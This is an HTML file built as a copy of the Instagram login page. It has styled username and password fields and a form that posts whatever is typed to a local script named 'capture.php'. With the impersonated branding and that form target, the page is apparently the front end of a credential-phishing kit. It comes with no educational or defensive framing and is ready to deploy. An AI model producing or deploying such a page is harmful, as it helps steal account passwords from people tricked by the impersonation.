<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 20px;
      width: 350px;
      text-align: center;
      box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
    }
    .login-container h1 {
      font-family: 'Grand Hotel', cursive;
      font-size: 50px;
      color: #262626;
    }
    .input-group {
      margin-bottom: 15px;
    }
    .input-group label {
      display: none;
    }
    .input-group input {
      width: 100%;
      padding: 10px;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
    }
    .btn {
      width: 100%;
      padding: 10px;
      font-size: 14px;
      background-color: #3897f0;
      color: #fff;
      border: none;
      border-radius: 3px;
      cursor: pointer;
    }
    .btn:hover {
      background-color: #3178c6;
    }
    .options {
      margin-top: 15px;
    }
    .options p {
      margin: 10px 0;
      color: #8e8e8e;
      font-size: 12px;
    }
    .options a {
      color: #3897f0;
      text-decoration: none;
      font-size: 12px;
    }
    .get-app {
      margin-top: 20px;
      font-size: 12px;
    }
    .get-app img {
      width: 120px;
      margin: 5px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h1>Instagram</h1>
    <form action="./capture.php" method="POST">
      <div class="input-group">
        <label for="username">Phone number, username, or email</label>
        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
      </div>
      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Password" required>
      </div>
      <button type="submit" class="btn">Log In</button>
      <div class="options">
        <p>OR</p>
        <button type="button" class="btn-secondary">Log in with Facebook</button>
        <a href="#" class="forgot-password">Forgot password?</a>
      </div>
    </form>
    <p class="get-app">Don't have an account? <a href="#">Sign up</a></p>
    <div class="get-app">
      <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
      <img src="https://upload.wikimedia.org/wikipedia/commons/f/f1/Available_on_the_Microsoft_Store_badge.svg" alt="Get it on Microsoft Store">
    </div>
  </div>
</body>
</html>
